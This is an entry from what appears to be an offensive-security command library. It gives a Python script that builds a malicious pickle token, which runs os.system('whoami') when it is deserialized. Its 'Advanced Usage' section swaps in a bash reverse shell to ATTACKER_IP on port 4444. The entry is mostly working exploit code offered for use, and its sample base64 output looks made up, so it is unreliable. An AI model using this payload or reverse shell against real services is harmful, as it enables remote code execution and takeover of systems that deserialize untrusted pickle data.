---
id: new-uuid-for-command-1
name: python-generate-malicious-pickle-token
type: command
executor: python
data: |-
  import cPickle, os
  from base64 import b64encode

  class Evil(object):
      def __reduce__(self):
          return (os.system,("whoami",))

  e = Evil()
  evil_token = b64encode(cPickle.dumps(e))
  print("Your Evil Token : {}").format(evil_token)
output: null
created_at: '2023-04-06T03:55:59.484537+00:00'
updated_at: '2024-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - rce
  - pickle
verified: true
validated: true
---

# Python Generate Malicious Pickle Token

## Command

```python
import cPickle, os
from base64 import b64encode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

## Description

This command runs a Python script to create a malicious serialized pickle object that executes the 'whoami' command upon deserialization. It defines an Evil class with a __reduce__ method to inject os.system, serializes the instance, base64-encodes it, and prints the token for use in exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; hardcoded to 'whoami' command | N/A |

## Examples

### Basic Usage

Save as script.py and run:

```bash
python script.py
```

### Advanced Usage

Modify the os.system argument for custom commands (e.g., reverse shell):

```python
return (os.system, ("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",))
```

## Expected Output

Your Evil Token : gASVBQAAAAAAAABMBXBvc2VzeXN0ZW0gCAAAAFV3aG9hbWljGFpbQ==

(The exact base64 will vary slightly but represents the serialized Evil object.)

## Related

- [[procedures/Exploit-Python-Pickle-Deserialization-for-RCE]]
- [[codes/create-evil-pickle-object]]
